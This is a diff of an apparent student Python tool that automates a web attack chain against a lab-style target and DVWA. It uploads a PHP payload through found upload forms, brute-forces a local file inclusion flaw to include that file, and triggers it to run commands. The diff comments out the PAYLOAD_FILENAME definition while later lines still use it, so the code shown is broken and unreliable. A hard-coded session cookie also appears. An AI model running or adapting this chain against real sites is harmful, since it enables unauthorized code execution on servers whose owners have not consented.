@@ -10,7 +10,7 @@ import uploadv2
 # Fictional Company
 URL = "http://ict2214p1b2.mooo.com/"
 COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
-PAYLOAD_FILENAME = "test.php"
+#PAYLOAD_FILENAME = "test.php"
 
 # DVWA
 # URL = "http://127.0.0.1/DVWA/"
@@ -57,7 +57,6 @@ def main():
     print("\nPotential LFI vulnerabilities:")
     lfi_targets = crawler.check_lfi(found_urls)
 
-    # Need to add for LFI
     lfi_confirmed_targets = set()
     for target in lfi_targets:
         print(target)
@@ -66,23 +65,23 @@ def main():
             lfi_confirmed_targets.add(target)
 
     # Generate the payloads
-    # payload_filenames = uploadv2.create_payloads()
-    
+    payload_filenames = uploadv2.create_payloads()
+
     # Use dynamic wordlists to determine endpoints:
     # dynamic_upload_url = uploadv2.try_upload_url(args.url, args.upload_url_wordlist, COOKIE, PAYLOAD_FILENAME)
     # if dynamic_upload_url is None:
     #     print("[-] No valid upload URL found. Exiting.")
     #     exit(1)
 
-    # for url in uploadable_urls:
-    #     if uploadv2.upload_file(url, PAYLOAD_FILENAME, COOKIE):
-    #         print(f"[+] File upload Success. URL: {url}.")
+    for url in uploadable_urls:
+        if uploadv2.upload_file(url, PAYLOAD_FILENAME, COOKIE):
+            print(f"[+] File upload Success. URL: {url}.")
 
-    # dynamic_upload_dir = uploadv2.get_upload_directory(
-    #     URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE
-    # )
-    # # print(f"Dynamic Upload URL: {dynamic_upload_url}")
-    # print(f"Dynamic Upload Directory: {dynamic_upload_dir}")
+    dynamic_upload_dir = uploadv2.get_upload_directory(
+        URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE
+    )
+    # print(f"Dynamic Upload URL: {dynamic_upload_url}")
+    print(f"Dynamic Upload Directory: {dynamic_upload_dir}")
 
     # # Upload the payload using the dynamic endpoint
     # if not uploadv2.upload_file(dynamic_upload_url, PAYLOAD_FILENAME, COOKIE):
@@ -91,7 +90,6 @@ def main():
     # direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
     # print(f"[+] Direct file URL (if accessible): {direct_file_url}")
 
-    # Need to add for LFI
     # --- LFI Brute Force Phase ---
     lfi_found_url = None
     for target in lfi_confirmed_targets:
@@ -99,8 +97,7 @@ def main():
         lfi_found_url = lfi.brute_force_lfi(target, PAYLOAD_FILENAME, session, COOKIE)
         if lfi_found_url:
             break
-    
-    # Need to add for LFI
+
     # --- Trigger Payload Phase ---
     if lfi_found_url:
         command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
